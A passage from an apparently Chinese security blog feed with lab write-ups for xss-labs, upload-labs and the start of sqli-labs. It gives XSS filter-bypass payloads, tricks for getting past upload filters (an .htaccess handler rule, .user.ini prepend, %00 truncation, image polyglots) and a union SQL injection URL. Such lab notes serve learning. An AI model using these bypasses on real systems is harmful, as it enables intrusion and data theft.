src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202858663.png" alt="image-20250227222313266"></p><p>使用onclick&#x3D;“copyText（）<strong>（copyText（）为js弹窗脚本）</strong></p></li></ul><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202900495.png" alt="image-20250227223741540"></p><p>onclick出现下划线（过滤onclick）</p></li><li><p>使用超链接进行绕过</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202901654.png" alt="image-20250227223939914"></p><p>在对话框写入</p><p>形成超链接，点击就可通过</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202903576.png" alt="image-20250227224038881"></p><figure class="shiki json"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">”&gt;&lt;a href=&#39;javascript:alert(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)&#39;&gt;</span></span></code></pre></div></div></figure></li></ul><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><ul><li><p>再次写入超链接</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202905079.png" alt="image-20250227224252242"></p><p>href出现下划线（过滤href）</p></li><li><p>修改大小写</p><figure class="shiki json"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">”&gt;&lt;a Href=&#39;javasCript:alert(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)&#39;&gt;</span></span></code></pre></div></div></figure><p>完成过滤</p></li></ul><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><ul><li><p>原代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202906538.png" alt="image-20250227224555322"></p><p>过滤为空</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202907901.png" alt="image-20250227224615994"></p><p>不是循环过滤（只过滤一次）</p></li><li><figure class="shiki json"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">”&gt;&lt;a hrefhref=&#39;javascriptcript:alert(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)&#39;&gt;</span></span></code></pre></div></div></figure><p>多写几个即可绕过</p></li></ul><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202909167.png" alt="image-20250227224756097"></p><p>已经存在</p><figure class="shiki json"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">”&gt;&lt;a href</span></span></code></pre></div></div></figure></li><li><p>在输入框直接写入</p><figure class="shiki json"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">javascript:alert(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202910629.png" alt="image-20250227224904878"></p><p>再次出现下划线过滤</p></li><li><p>修改大小写也不行</p></li><li><p>使用编码进行过滤</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202911638.png" alt="image-20250227225109222"></p></li></ul><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><ul><li><p>填入编码代价</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202918823.png" alt="image-20250227225155296"></p></li><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202924068.png" alt="image-20250227225232942"></p><p>没有写入http&#x2F;&#x2F; 就不可执行</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202925245.png" alt="image-20250227225340042"></p><p>存在干扰(http:&#x2F;&#x2F;干扰js代码)</p></li><li><p>使用&#x2F;&#x2F;进行注释</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202926894.png" alt="image-20250227225420332"></p></li></ul><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><ul><li><p>隐藏数据</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202928882.png" alt="image-20250227230159477"></p><p><strong>hidden</strong></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202931247.png" alt="image-20250227230424159"><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202934518.png" alt="image-20250227230424299"></p><p>相当于使用     <strong>t_sort</strong> 进行过滤</p><p>所以直接在t_sort加入js代码</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202936173.png" alt="image-20250227230537548"></p><p>存在”“闭合（记得闭合代码）</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202937319.png" alt="image-20250227230649653"></p><p>写入type&#x3D;”text“（屏蔽隐藏属性，出现搜索框）</p></li><li><p>点击搜索框后，触发点击绕过</p></li></ul><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202939442.png" alt="image-20250227231923294"></p><p>写入后，未显示搜索框</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202941685.png" alt="image-20250228231250310"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202942849.png" alt="image-20250228231322189"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202944464.png" alt="image-20250228231451655"></p><p>抓包输入返回值：referer：xxxxx（内容为显示内容 t_sort）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202947095.png" alt="image-20250228231600639"></p><p>出现value值</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202949907.png" alt="image-20250228231711702"></p><p>将编码内容进行修改即可</p></li></ul><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202952224.png" alt="image-20250228232439571"></p><p>接受浏览器权限</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202953319.png" alt="image-20250228232356850"></p><p>抓包后，在对应位置加入js代码</p></li></ul><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202954404.png" alt="image-20250302215338696"></p></li><li><p>修改为 </p><figure class="shiki json"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">&quot; type=&#39;text&#39; onclick=&#39;javascript:alert(1)&#39;&gt;//</span></span></code></pre></div></div></figure></li><li><p>出现对话框</p></li></ul><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p>题目出错</p><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><ul><li><p>源代码出现</p><p><strong>ng—include</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202956332.png" alt="image-20250302220337450"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202958110.png" alt="image-20250302220952244"></p><p>尖括号被屏蔽</p></li><li><p>无对话框，所以<strong>不使用onclick</strong>（点击）</p></li><li><p>使用img</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202959781.png" alt="image-20250302221510739"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251029215914259.png" alt="image-20251029215914230"></p><p>‘   ’为图片的格式</p></li></ul><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><ul><li><p>输入代码查看过滤</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027203001876.png"></p><p>过滤了script和” ‘还有空格</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027203003217.png" alt="image-20250302222242463"></p><p>a标签  绕过script过滤  回车代替空格</p></li><li><p>然后点击图片</p></li></ul><h2 id="17，18-不支持"><a href="#17，18-不支持" class="headerlink" title="17，18(不支持)"></a>17，18(不支持)</h2><ul><li><p>源代码使用到了<strong>embed</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027203004735.png" alt="image-20250302223015962"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027203006004.png" alt="image-20250302223312646"></p><figure class="shiki json"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">- xss-labs-master:</span><span style="color: #D19A66">81</span><span style="color: #ABB2BF">/level</span><span style="color: #D19A66">17</span><span style="color: #ABB2BF">.php?arg</span><span style="color: #D19A66">01</span><span style="color: #ABB2BF">=a&amp;arg</span><span style="color: #D19A66">02</span><span style="color: #ABB2BF">=b**</span><span style="color: #D19A66">123</span><span style="color: #ABB2BF"> onclick=&#39;alert(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)&#39;**</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  xss-labs-master:</span><span style="color: #D19A66">81</span><span style="color: #ABB2BF">/level</span><span style="color: #D19A66">17</span><span style="color: #ABB2BF">.php?arg</span><span style="color: #D19A66">01</span><span style="color: #ABB2BF">=a&amp;arg</span><span style="color: #D19A66">02</span><span style="color: #ABB2BF">=b**</span><span style="color: #D19A66">123</span><span style="color: #ABB2BF"> onmousedown=&#39;alert(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)&#39;**</span></span></code></pre></div></div></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>靶场题解</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场题解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload_lab题解</title>
    <link href="/2025/10/27/upload_lab%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/10/27/upload_lab%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="upload-lab"><a href="#upload-lab" class="headerlink" title="upload_lab"></a>upload_lab</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><ul><li>禁止使用js文件即可</li></ul><h2 id="2（MIME）"><a href="#2（MIME）" class="headerlink" title="2（MIME）"></a>2（MIME）</h2><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202509346.png" alt="image-20250213005144971"></p><p>未限制类型</p><p>为白名单</p></li><li><p>提交php文件并且抓包绕过</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202524969.png" alt="image-20250213005117515"></p></li><li><p>将Content-Type修改为if中的正确条件</p><p>（image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif）</p></li><li><p>forword提交</p></li></ol><h2 id="3（phph5和php3和phtml实现绕过）"><a href="#3（phph5和php3和phtml实现绕过）" class="headerlink" title="3（phph5和php3和phtml实现绕过）"></a>3（<strong>phph5和php3和phtml</strong>实现绕过）</h2><ol><li><p>确定类型<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202526624.png" alt="image-20250213011454171"></p><p>罗列<strong>黑名单</strong></p></li><li><p>直接通过<strong>phph5和php3和phtml</strong>实现绕过</p></li><li><p>.pht .php3 .php4 .php5 .php6 .php7 .php8 .phtml)</p></li></ol><h2 id="4（htaccess）"><a href="#4（htaccess）" class="headerlink" title="4（htaccess）"></a>4（htaccess）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202528987.png" alt="image-20250213012033408"></p><p>罗列<strong>黑名单</strong></p><p><strong>未屏蔽.htaccess</strong></p></li><li><p>htaccess实现文件解析自定义</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202530404.png" alt="image-20250213013048887">（名称任意）（保存后，修改文件后缀为**.htaccess**)</p></li><li><p>提交此文件    .htaccess</p></li><li><p>提交任意后缀的文件</p><p>（提交的文件名称与图片相互匹配)</p></li><li><p>所提交文件为php格式</p></li></ol><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250307181457737.png" alt="image-20250307181457737"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&lt;FilesMatch .jpg&gt;</span></span><span class="line"><span style="color: #abb2bf">SetHandler application/x-httpd-php</span></span><span class="line"><span style="color: #abb2bf">&lt;/FilesMatch&gt;</span></span></code></pre></div></div></figure><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><ul><li><p>提交a.jpg(写了php代码)</p></li><li><p>写一个   <strong>.user.ini文件</strong></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">auto_prepend_file=a.jpg</span></span></code></pre></div></div></figure></li><li><p>提交后</p></li><li><p>访问readme.php</p></li></ul><h2 id="6（大小写）"><a href="#6（大小写）" class="headerlink" title="6（大小写）"></a>6（大小写）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202534518.png" alt="image-20250213013834182"></p><p>基本上禁用了所有后缀</p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>未禁用大小写</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202537001.png" alt="image-20250213014132854"></p><p>（没有这一条）</p></li><li><p>修改php为大写即可（PHP）</p></li></ol><h2 id="7（空格绕过）"><a href="#7（空格绕过）" class="headerlink" title="7（空格绕过）"></a>7（空格绕过）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202538742.png" alt="image-20250213014238310"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>缺少<strong>收尾去空</strong>（将字符串转化为空格，未去除空格）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202540684.png" alt="image-20250213014408766"></p><p>（没有这一条）</p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202542091.png" alt="image-20250213014649147"></p><p>在尾部加空格</p></li><li><p>forword提交</p></li></ol><h2 id="8（删除文件末尾的点）"><a href="#8（删除文件末尾的点）" class="headerlink" title="8（删除文件末尾的点）"></a>8（删除文件末尾的点）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202543627.png" alt="image-20250213015053022"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>缺少“删除文件末尾的点”</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202545767.png" alt="image-20250213015311465"></p><p>（没有这一条）</p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202547382.png" alt="image-20250213015448547"></p></li><li><p>forword提交</p></li></ol><h2 id="9（：：DATA）"><a href="#9（：：DATA）" class="headerlink" title="9（：：DATA）"></a>9（<strong>：：DATA</strong>）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202549962.png" alt="image-20250213015053022"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>缺少“将字符串转化为空格”</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202551794.png" alt="image-20250213015634038"></p><p>（没有这一条）</p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202553181.png" alt="image-20250213015800602"></p><p>在后面写<strong>：：DATA</strong></p></li><li><p>forword提交</p></li></ol><h2 id="10（只有一次过滤）"><a href="#10（只有一次过滤）" class="headerlink" title="10（只有一次过滤）"></a>10（只有一次过滤）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202554500.png" alt="image-20250213015053022"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>啥都不少，但是源代码<strong>只有一次过滤</strong></p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202556137.png" alt="image-20250213020343377"></p><p>多写几层</p></li><li><p>forword提交</p></li></ol><h2 id="11（过滤黑名单有的后缀）"><a href="#11（过滤黑名单有的后缀）" class="headerlink" title="11（过滤黑名单有的后缀）"></a>11（<strong>过滤黑名单有的后缀</strong>）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202557167.png" alt="image-20250213015053022"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>啥都不少，但是源代码<strong>只有一次过滤</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202558335.png" alt="image-20250213020702307"></p><p><strong>过滤黑名单有的后缀</strong></p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202559673.png" alt="image-20250213021057055"></p><p>多写几次</p></li><li><p>forword提交</p></li></ol><h2 id="12（-00截断）（get）"><a href="#12（-00截断）（get）" class="headerlink" title="12（%00截断）（get）"></a>12（%00截断）（get）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202600735.png" alt="image-20250213021159570"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>源代码满足多次过滤</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202602068.png" alt="image-20250213021313487"></p><p>（图中所示**+1即为循环**）</p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202603526.png" alt="image-20250213023637421"></p><p>修改提交路径</p><p>添加1.php%00</p><p>（%00会截断后面的部分，即xxx.jpg）</p></li><li><p>forword提交</p></li></ol><h2 id="13（-00截断）（post）"><a href="#13（-00截断）（post）" class="headerlink" title="13（%00截断）（post）"></a>13（%00截断）（post）</h2><ol><li><p>确定类型</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202604714.png" alt="image-20250213023909677"></p></li><li><p>往下查看<strong>条件</strong></p></li><li><p>源代码满足多次过滤</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202607016.png" alt="image-20250213021313487"></p><p>（图中所示**+1即为循环**）</p></li><li><p>为post提交方式</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202608553.png" alt="image-20250213030200898"></p></li><li><p>抓包</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202614443.png" alt="image-20250213030336875"></p><p>修改提交路径</p><p>添加1.php%00</p><p>（%00会截断后面的部分，即xxx.jpg）</p></li><li><p>post提交需要编码%00</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202618967.png" alt="image-20250213030458867"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202620933.png" alt="image-20250213030648499"></p></li><li><p>forword提交</p></li></ol><h2 id="14-图片码"><a href="#14-图片码" class="headerlink" title="14(图片码)"></a>14(图片码)</h2><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">查看提示，说检查图片内容开头两个字节。</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">PEG/IFIF（常见的照片格式)：头两个字节为·0 xFF·0xD8。</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">PNG（无损压缩格式)：头两个字节为·0x89·0x50。</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">GIF（支持动画的图像格式)：头两个字节为·0x47·0x49。</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">BMP(Windows位图格式)：头两个字节为·0x42·0x4D。</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">TFF(标签图像文件格式)：头两个字节可以是不同的数值</span></span></code></pre></div></div></figure><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202623263.png" alt="image-20250213023909677"></p></li><li><p>根据题目要求，将png文件，php文件打开</p><p>将php中代码粘贴·到png中———&gt;生成一个新文件为jpg的文件</p><p>（上传图片，所以是<strong>jpg格式</strong>的）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202626542.png" alt="image-20250213230853507"></p></li><li><p>配合文件包含漏洞–将图片转化为php代码执行</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202631596.png" alt="image-20250213231620298"></p><p>（file的名称为所上传图片的地址）</p></li></ol><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202634747.png" alt="image-20250213233806957"></p></li><li><p>函数表名，只能提交图像（不是图像无法执行）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202636849.png" alt="image-20250213233915636"></p></li></ol><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202638146.png" alt="image-20250213234142840"></p></li><li><p>函数表名，只能提交图像（不是图像无法执行）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202639952.png" alt="image-20250213234202315"></p></li><li></li></ol><h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202641450.png" alt="image-20250213234350113"></p></li><li><p>函数表名，只能提交图像（不是图像无法执行）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202643388.png" alt="image-20250213234408359"></p></li></ol><h2 id="18（二次渲染）（条件竞争）"><a href="#18（二次渲染）（条件竞争）" class="headerlink" title="18（二次渲染）（条件竞争）"></a>18（二次渲染）（条件竞争）</h2><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202646712.png" alt="image-20250214003010406"></p></li><li><p>先移动，再条件</p></li><li></li></ol><h2 id="19（二次渲染）（条件竞争）"><a href="#19（二次渲染）（条件竞争）" class="headerlink" title="19（二次渲染）（条件竞争）"></a>19（二次渲染）（条件竞争）</h2><p>1. </p><h2 id="20（黑名单下：文件夹名称）"><a href="#20（黑名单下：文件夹名称）" class="headerlink" title="20（黑名单下：文件夹名称）"></a>20（黑名单下：文件夹名称）</h2><ol><li><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202648354.png" alt="image-20250214003208206"></p></li><li><p>最终判定的条件名称(if)与提交文件名（post save_name）有关</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202649938.png" alt="image-20250214003543621"></p></li><li><p>抓包，末尾添加饶过的词语</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202656931.png" alt="image-20250214003705994"></p><p><strong>或者</strong></p><ol><li><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202658581.png" alt="image-20250214004038208"></li><li>抓包，末尾添加饶过的词语，变成文件夹名称</li><li><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202659839.png" alt="image-20250214004120826"></li></ol></li></ol><h2 id="21（白名单下：文件夹名称）"><a href="#21（白名单下：文件夹名称）" class="headerlink" title="21（白名单下：文件夹名称）"></a>21（白名单下：文件夹名称）</h2><ol><li><p>查看源代码<img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250214004247923.png" alt="image-20250214004247923"></p></li><li><p>数组影响最后结果</p><p>save_name[0]影响文件名称</p><p>save_name[1]写不写都行（为一个点）</p><p>save_name[2]文件后缀</p></li><li><p>抓包进行修改<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202702765.png" alt="image-20250214005515857"></p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202705438.png" alt="image-20250214005702713"></p><p>（类似这种情况的文件名上传）</p>]]></content>
    
    
    <categories>
      
      <category>靶场题解</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场题解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlilab题解&amp;&amp;总结</title>
    <link href="/2025/10/27/sqlilab%E9%A2%98%E8%A7%A3&amp;&amp;%E6%80%BB%E7%BB%93/"/>
    <url>/2025/10/27/sqlilab%E9%A2%98%E8%A7%A3&amp;&amp;%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="闭合报错"><a href="#闭合报错" class="headerlink" title="闭合报错"></a>闭合报错</h1><ul><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1’</span></span><span class="line"><span style="color: #abb2bf">?id=1”</span></span></code></pre></div></div></figure><ul><li><p>如果都报错，则为整形闭合</p><p>尝试?id&#x3D;1–+</p><ul><li>无报错则整形闭合。报错则整形加括号</li></ul></li><li><p>如果单引号报错，双引号不报错</p><p>尝试?id&#x3D;1’–+</p><ul><li>无报错则单引号闭合。报错则单引号加括号</li></ul></li><li><p>如果单引号不报错，双引号报错。<br>尝试?id&#x3D;1”–+</p><ul><li>无报错则双引号闭合。报错则双引号加括号。</li></ul></li></ul></li></ul><h1 id="sqlilab"><a href="#sqlilab" class="headerlink" title="sqlilab"></a>sqlilab</h1><h2 id="1（联合注入）"><a href="#1（联合注入）" class="headerlink" title="1（联合注入）"></a>1（联合注入）</h2><p>第一关反馈数字为字符型</p><p>注入需要<strong>？id&#x3D;1’</strong></p><ul><li><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200843970.png" alt="image-20250303140526440" style="zoom:33%;" /><p>使用？id&#x3D;xx测试</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200845249.png" alt="image-20250303140624439"></p></li><li><p>拆解</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200848557.png" alt="image-20250303141258773"></p><p>有3段</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200851484.png" alt="image-20250303141414242"></p><p>爆出数据所在位置</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200853667.png" alt="image-20250303141609972"></p><p>爆出版本和库名</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200858277.png" alt="image-20250303141852965"></p><p>查所有表名</p><p><a href="http://sqli-labs-master:82/Less-1/?id=-1%27union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27--+">http://sqli-labs-master:82/Less-1/?id=-1%27union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27--+</a></p></li><li><p>用户的账号密码大概率在user<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200907510.png" alt="image-20250303142024485"></p><p>查列名（得到id）</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200909384.png" alt="image-20250303143004111"></p><p>查询user下的所有列名（得到username  passward）</p><p><a 